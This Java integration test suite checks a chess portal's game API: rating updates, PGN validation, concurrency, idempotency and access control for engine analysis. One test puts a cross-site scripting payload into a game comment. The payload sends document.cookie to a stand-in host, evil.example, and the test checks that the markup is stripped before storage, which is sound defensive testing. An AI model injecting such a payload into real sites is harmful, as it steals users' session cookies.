package no.sjakkportal.api;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import java.time.Instant;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.Callable;
import no.sjakkportal.common.error.ErrorCode;
import no.sjakkportal.support.ApiIntegrationTest;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;

class GameApiTest extends ApiIntegrationTest {

    private static final String SCHOLARS_MATE = "1. e4 e5 2. Qh5 Nc6 3. Bc4 Nf6 4. Qxf7# 1-0";

    private long admin;
    private long kari;
    private long ola;
    private long per;
    private String adminToken;
    private String kariToken;
    private String olaToken;
    private String perToken;

    @BeforeEach
    void setUp() throws Exception {
        admin = createAdmin("admin");
        kari = createPlayer("kari");
        ola = createPlayer("ola");
        per = createPlayer("per");
        adminToken = login("admin");
        kariToken = login("kari");
        olaToken = login("ola");
        perToken = login("per");
    }

    private Map<String, Object> game(long white, long black, String result) {
        Map<String, Object> body = new HashMap<>();
        body.put("whiteId", white);
        body.put("blackId", black);
        body.put("result", result);
        return body;
    }

    private MvcResult submit(String token, Map<String, Object> body) throws Exception {
        return mvc.perform(as(jsonPost("/api/games", body), token)).andReturn();
    }

    private int rating(long user) {
        return jdbc.queryForObject("SELECT rating FROM app_user WHERE id = ?", Integer.class, user);
    }

    private int ratedGames(long user) {
        return jdbc.queryForObject("SELECT rated_games FROM app_user WHERE id = ?", Integer.class, user);
    }

    private int count(String table) {
        return jdbc.queryForObject("SELECT count(*) FROM " + table, Integer.class);
    }

    @Nested
    class Registering {

        @Test
        void resultOnlyGameUpdatesBothRatings() throws Exception {
            MvcResult result = submit(kariToken, game(kari, ola, "WHITE_WIN"));

            assertThat(result.getResponse().getStatus()).isEqualTo(201);
            // Both players are provisional (K = 40) and equal: 40 * 0.5 = 20.
            assertThat(body(result).get("whiteRatingDelta").asInt()).isEqualTo(20);
            assertThat(body(result).get("blackRatingDelta").asInt()).isEqualTo(-20);
            assertThat(rating(kari)).isEqualTo(1220);
            assertThat(rating(ola)).isEqualTo(1180);
            assertThat(ratedGames(kari)).isEqualTo(1);
            assertThat(ratedGames(ola)).isEqualTo(1);
            assertThat(count("rating_history")).isEqualTo(2);
            assertThat(result.getResponse().getHeader("Location")).endsWith("/api/games/" + body(result).get("id").asLong());
        }

        @Test
        void eitherParticipantOrAnAdminMayRegisterTheGame() throws Exception {
            assertThat(submit(kariToken, game(kari, ola, "DRAW")).getResponse().getStatus()).isEqualTo(201);
            assertThat(submit(olaToken, game(kari, ola, "DRAW")).getResponse().getStatus()).isEqualTo(201);
            assertThat(submit(adminToken, game(kari, ola, "DRAW")).getResponse().getStatus()).isEqualTo(201);
        }

        @Test
        void outsiderCannotRegisterAGameBetweenTwoOtherPlayers() throws Exception {
            MvcResult result = submit(perToken, game(kari, ola, "BLACK_WIN"));

            assertThat(body(result).get("code").asText()).isEqualTo(ErrorCode.GAME_NOT_PARTICIPANT.code());
            assertThat(count("game")).isZero();
            assertThat(rating(kari)).isEqualTo(1200);
            assertThat(rating(ola)).isEqualTo(1200);
        }

        @Test
        void pgnIsValidatedAndStoredNormalised() throws Exception {
            Map<String, Object> body = game(kari, ola, "WHITE_WIN");
            body.put("pgn", SCHOLARS_MATE);
            MvcResult created = submit(kariToken, body);
            assertThat(created.getResponse().getStatus()).isEqualTo(201);
            long id = body(created).get("id").asLong();

            mvc.perform(as(get("/api/games/" + id), perToken))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.plyCount").value(7))
                    .andExpect(jsonPath("$.termination").value("CHECKMATE"))
                    .andExpect(jsonPath("$.moves.length()").value(7))
                    .andExpect(jsonPath("$.moves[6].san").value("Qxf7#"))
                    .andExpect(jsonPath("$.moves[6].uci").value("h5f7"))
                    .andExpect(jsonPath("$.white.username").value("kari"));
        }

        @Test
        void resultThatContradictsThePgnIsRejectedAndNothingIsStored() throws Exception {
            Map<String, Object> body = game(kari, ola, "BLACK_WIN");
            body.put("pgn", SCHOLARS_MATE);
            assertThat(body(submit(kariToken, body)).get("code").asText()).isEqualTo(ErrorCode.PGN_RESULT_MISMATCH.code());

            body.put("result", "WHITE_WIN");
            body.put("pgn", "1. e4 e5 2. Ke3 1-0");
            assertThat(body(submit(kariToken, body)).get("code").asText()).isEqualTo(ErrorCode.PGN_ILLEGAL_MOVE.code());

            assertThat(count("game")).isZero();
            assertThat(count("rating_history")).isZero();
            assertThat(rating(kari)).isEqualTo(1200);
        }

        @Test
        void pgnWithUndecidedResultTagAcceptsTheSubmittedResult() throws Exception {
            Map<String, Object> body = game(kari, ola, "BLACK_WIN");
            body.put("pgn", "1. e4 e5 2. Nf3 Nc6 *");
            body.put("termination", "RESIGNATION");
            assertThat(submit(kariToken, body).getResponse().getStatus()).isEqualTo(201);
        }

        @Test
        void invalidGamesAreRejectedWithTheRightCode() throws Exception {
            assertThat(body(submit(kariToken, game(kari, kari, "DRAW"))).get("code").asText()).isEqualTo(ErrorCode.GAME_SAME_PLAYER.code());
            assertThat(body(submit(kariToken, game(kari, 987654, "DRAW"))).get("code").asText()).isEqualTo(ErrorCode.USER_NOT_FOUND.code());
            assertThat(body(submit(kariToken, game(kari, ola, "KARI_VANT"))).get("code").asText())
                    .isIn(ErrorCode.VALIDATION_FAILED.code(), ErrorCode.MALFORMED_REQUEST.code());
            Map<String, Object> missing = game(kari, ola, "DRAW");
            missing.remove("result");
            assertThat(body(submit(kariToken, missing)).get("code").asText()).isEqualTo(ErrorCode.VALIDATION_FAILED.code());
            Map<String, Object> future = game(kari, ola, "DRAW");
            future.put("playedAt", Instant.now().plusSeconds(86_400).toString());
            assertThat(body(submit(kariToken, future)).get("code").asText()).isEqualTo(ErrorCode.VALIDATION_FAILED.code());
            assertThat(count("game")).isZero();
        }

        @Test
        void disabledPlayersCannotBeGivenGames() throws Exception {
            jdbc.update("UPDATE app_user SET enabled = FALSE WHERE id = ?", ola);
            assertThat(submit(kariToken, game(kari, ola, "WHITE_WIN")).getResponse().getStatus()).isIn(404, 409, 422);
            assertThat(rating(ola)).isEqualTo(1200);
        }

        @Test
        void unratedGameLeavesRatingsAlone() throws Exception {
            Map<String, Object> body = game(kari, ola, "WHITE_WIN");
            body.put("rated", false);
            MvcResult result = submit(kariToken, body);

            assertThat(result.getResponse().getStatus()).isEqualTo(201);
            assertThat(rating(kari)).isEqualTo(1200);
            assertThat(ratedGames(kari)).isZero();
            assertThat(count("rating_history")).isZero();
        }

        @Test
        void commentMarkupIsNeutralised() throws Exception {
            Map<String, Object> body = game(kari, ola, "DRAW");
            body.put("comment", "Spennende! <script>fetch('//evil.example?c='+document.cookie)</script>");
            long id = body(submit(kariToken, body)).get("id").asLong();

            String stored = jdbc.queryForObject("SELECT comment FROM game WHERE id = ?", String.class, id);
            assertThat(stored).startsWith("Spennende!").doesNotContain("<", ">");
        }

        @Test
        void clientCannotDictateRatingsOrOwnership() throws Exception {
            Map<String, Object> body = game(kari, ola, "WHITE_WIN");
            body.put("whiteRatingDelta", 900);
            body.put("blackRatingDelta", -900);
            body.put("createdBy", admin);
            body.put("id", 7777);
            body.put("status", "LIVE");
            MvcResult result = submit(kariToken, body);

            assertThat(result.getResponse().getStatus()).isIn(201, 400);
            assertThat(rating(kari)).isLessThanOrEqualTo(1220);
            assertThat(rating(ola)).isGreaterThanOrEqualTo(1180);
            assertThat(jdbc.queryForObject("SELECT count(*) FROM game WHERE id = 7777 OR created_by = ?", Integer.class, admin)).isZero();
        }

        @Test
        void unknownGameIsNotFound() throws Exception {
            mvc.perform(as(get("/api/games/424242"), kariToken)).andExpect(problem(ErrorCode.GAME_NOT_FOUND));
        }
    }

    @Nested
    class Concurrency {

        /**
         * Many games involving the same players land at once. Read-modify-write on the rating without
         * locking loses updates; inconsistent lock ordering deadlocks. Afterwards the books must balance exactly.
         */
        @Test
        void simultaneousSubmissionsNeverCorruptRatings() throws Exception {
            long[] players = {kari, ola, per, createPlayer("anne"), createPlayer("nils")};
            String[] results = {"WHITE_WIN", "BLACK_WIN", "DRAW"};
            Random random = new Random(2026);
            List<Callable<MvcResult>> tasks = new ArrayList<>();
            for (int i = 0; i < 40; i++) {
                int white = random.nextInt(players.length);
                int black = (white + 1 + random.nextInt(players.length - 1)) % players.length;
                Map<String, Object> body = game(players[white], players[black], results[random.nextInt(3)]);
                tasks.add(() -> submit(adminToken, body));
            }
            List<MvcResult> responses = runConcurrently(tasks);

            assertThat(responses).allSatisfy(r -> assertThat(r.getResponse().getStatus())
                    .as(r.getResponse().getContentAsString()).isEqualTo(201));
            assertThat(count("game")).isEqualTo(40);
            assertThat(count("rating_history")).isEqualTo(80);

            for (long player : players) {
                Integer played = jdbc.queryForObject("SELECT count(*) FROM game WHERE white_id = ? OR black_id = ?",
                        Integer.class, player, player);
                assertThat(ratedGames(player)).as("rated_games of %d", player).isEqualTo(played);

                // Each history row must start where the previous one ended: a gap means a lost update.
                List<Map<String, Object>> history = jdbc.queryForList(
                        "SELECT rating_before, rating_after FROM rating_history WHERE user_id = ? ORDER BY id", player);
                int expected = 1200;
                for (Map<String, Object> row : history) {
                    assertThat(row.get("rating_before")).as("history chain of %d", player).isEqualTo(expected);
                    expected = (Integer) row.get("rating_after");
                }
                assertThat(rating(player)).as("final rating of %d", player).isEqualTo(expected);
            }

            // The deltas stored on each game agree with the history rows.
            Integer mismatches = jdbc.queryForObject("""
                    SELECT count(*) FROM game g
                    JOIN rating_history w ON w.game_id = g.id AND w.user_id = g.white_id
                    JOIN rating_history b ON b.game_id = g.id AND b.user_id = g.black_id
                    WHERE g.white_rating_delta <> w.rating_after - w.rating_before
                       OR g.black_rating_delta <> b.rating_after - b.rating_before
                       OR g.white_rating_before <> w.rating_before OR g.black_rating_before <> b.rating_before""", Integer.class);
            assertThat(mismatches).isZero();
        }

        /** A and B play each other in both colour orders at the same moment: the classic lock-ordering deadlock. */
        @Test
        void mirroredSubmissionsDoNotDeadlock() throws Exception {
            List<Callable<Integer>> tasks = new ArrayList<>();
            for (int i = 0; i < 20; i++) {
                Map<String, Object> body = i % 2 == 0 ? game(kari, ola, "WHITE_WIN") : game(ola, kari, "WHITE_WIN");
                String token = i % 2 == 0 ? kariToken : olaToken;
                tasks.add(() -> submit(token, body).getResponse().getStatus());
            }
            assertThat(runConcurrently(tasks)).containsOnly(201);
            assertThat(ratedGames(kari)).isEqualTo(20);
            assertThat(rating(kari) + rating(ola)).isBetween(2390, 2410);
        }

        @Test
        void doubleClickedSubmitWithAnIdempotencyKeyCreatesOneGame() throws Exception {
            String key = UUID.randomUUID().toString();
            Map<String, Object> body = game(kari, ola, "WHITE_WIN");
            List<Callable<MvcResult>> tasks = new ArrayList<>();
            for (int i = 0; i < 6; i++) {
                tasks.add(() -> mvc.perform(as(jsonPost("/api/games", body), kariToken).header("Idempotency-Key", key)).andReturn());
            }
            List<MvcResult> responses = runConcurrently(tasks);

            assertThat(responses).allMatch(r -> r.getResponse().getStatus() == 201 || r.getResponse().getStatus() == 200);
            assertThat(responses.stream().map(r -> {
                try {
                    return body(r).get("id").asLong();
                } catch (Exception e) {
                    throw new IllegalStateException(e);
                }
            }).distinct()).hasSize(1);
            assertThat(count("game")).isEqualTo(1);
            assertThat(rating(kari)).isEqualTo(1220);
            assertThat(ratedGames(ola)).isEqualTo(1);
        }

        @Test
        void idempotencyKeysAreScopedToTheUserAndMustBeUuids() throws Exception {
            String key = UUID.randomUUID().toString();
            mvc.perform(as(jsonPost("/api/games", game(kari, ola, "DRAW")), kariToken).header("Idempotency-Key", key))
                    .andExpect(status().isCreated());
            // Ola reusing Kari's key must not be handed Kari's request, nor blocked by it.
            mvc.perform(as(jsonPost("/api/games", game(ola, per, "DRAW")), olaToken).header("Idempotency-Key", key))
                    .andExpect(status().isCreated());
            mvc.perform(as(jsonPost("/api/games", game(kari, ola, "DRAW")), kariToken).header("Idempotency-Key", "not-a-uuid"))
                    .andExpect(problem(ErrorCode.VALIDATION_FAILED));
            assertThat(count("game")).isEqualTo(2);
        }
    }

    @Nested
    class Analysis {

        private long finishedGameWithMoves() throws Exception {
            Map<String, Object> body = game(kari, ola, "WHITE_WIN");
            body.put("pgn", SCHOLARS_MATE);
            return body(submit(kariToken, body)).get("id").asLong();
        }

        private Map<String, Object> analysis(int plies) {
            List<Map<String, Object>> moves = new ArrayList<>();
            for (int ply = 1; ply <= plies; ply++) {
                moves.add(Map.of("ply", ply, "cp", 30, "best", "e2e4", "classification", ply == plies ? "BEST" : "INACCURACY"));
            }
            Map<String, Object> body = new HashMap<>();
            body.put("engine", "Stockfish 17 WASM");
            body.put("depth", 16);
            body.put("whiteAccuracy", 91.5);
            body.put("blackAccuracy", 42.25);
            body.put("whiteAcpl", 18);
            body.put("blackAcpl", 140);
            body.put("moves", moves);
            return body;
        }

        private MvcResult save(String token, long gameId, Map<String, Object> body) throws Exception {
            return mvc.perform(as(put("/api/games/" + gameId + "/analysis").contentType(MediaType.APPLICATION_JSON)
                    .content(json.writeValueAsString(body)), token)).andReturn();
        }

        @Test
        void participantSavesAnalysisAndAnyoneCanReadIt() throws Exception {
            long id = finishedGameWithMoves();
            assertThat(save(olaToken, id, analysis(7)).getResponse().getStatus()).isIn(200, 204);

            mvc.perform(as(get("/api/games/" + id + "/analysis"), perToken))
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.whiteAccuracy").value(91.5))
                    .andExpect(jsonPath("$.moves.length()").value(7));
        }

        @Test
        void savingAgainReplacesInsteadOfDuplicating() throws Exception {
            long id = finishedGameWithMoves();
            save(kariToken, id, analysis(7));
            Map<String, Object> deeper = analysis(7);
            deeper.put("depth", 22);
            assertThat(save(kariToken, id, deeper).getResponse().getStatus()).isIn(200, 204);
            assertThat(count("game_analysis")).isEqualTo(1);
            assertThat(jdbc.queryForObject("SELECT depth FROM game_analysis WHERE game_id = ?", Integer.class, id)).isEqualTo(22);
        }

        @Test
        void simultaneousSavesFromSeveralBrowsersLeaveOneRow() throws Exception {
            long id = finishedGameWithMoves();
            List<Callable<Integer>> tasks = new ArrayList<>();
            for (int i = 0; i < 8; i++) {
                String token = i % 2 == 0 ? kariToken : olaToken;
                tasks.add(() -> save(token, id, analysis(7)).getResponse().getStatus());
            }
            assertThat(runConcurrently(tasks)).allMatch(s -> s == 200 || s == 204 || s == 409);
            assertThat(count("game_analysis")).isEqualTo(1);
        }

        /** Analysis feeds a player's accuracy and blunder statistics, so outsiders must not be able to plant it. */
        @Test
        void outsiderCannotPlantAnalysisOnSomeoneElsesGame() throws Exception {
            long id = finishedGameWithMoves();
            assertThat(body(save(perToken, id, analysis(7))).get("code").asText()).isEqualTo(ErrorCode.GAME_NOT_PARTICIPANT.code());
            assertThat(count("game_analysis")).isZero();
        }

        @Test
        void implausibleAnalysisIsRejected() throws Exception {
            long id = finishedGameWithMoves();
            Map<String, Object> tooAccurate = analysis(7);
            tooAccurate.put("whiteAccuracy", 140);
            Map<String, Object> negative = analysis(7);
            negative.put("blackAccuracy", -1);
            Map<String, Object> wrongLength = analysis(9);
            Map<String, Object> noMoves = analysis(0);
            Map<String, Object> absurdDepth = analysis(7);
            absurdDepth.put("depth", 9000);
            Map<String, Object> badClass = analysis(7);
            badClass.put("moves", List.of(Map.of("ply", 1, "cp", 0, "best", "e2e4", "classification", "<b>GENIUS</b>")));

            for (Map<String, Object> bad : List.of(tooAccurate, negative, wrongLength, noMoves, absurdDepth, badClass)) {
                assertThat(body(save(kariToken, id, bad)).get("code").asText())
                        .isIn(ErrorCode.ANALYSIS_INVALID.code(), ErrorCode.VALIDATION_FAILED.code());
            }
            assertThat(count("game_analysis")).isZero();
        }

        @Test
        void gameWithoutMovesCannotBeAnalysed() throws Exception {
            long id = body(submit(kariToken, game(kari, ola, "DRAW"))).get("id").asLong();
            assertThat(body(save(kariToken, id, analysis(7))).get("code").asText())
                    .isEqualTo(ErrorCode.ANALYSIS_GAME_NOT_FINISHED.code());
        }

        @Test
        void analysisOfUnknownGameIsNotFound() throws Exception {
            assertThat(body(save(adminToken, 424242, analysis(7))).get("code").asText()).isEqualTo(ErrorCode.GAME_NOT_FOUND.code());
        }
    }
}
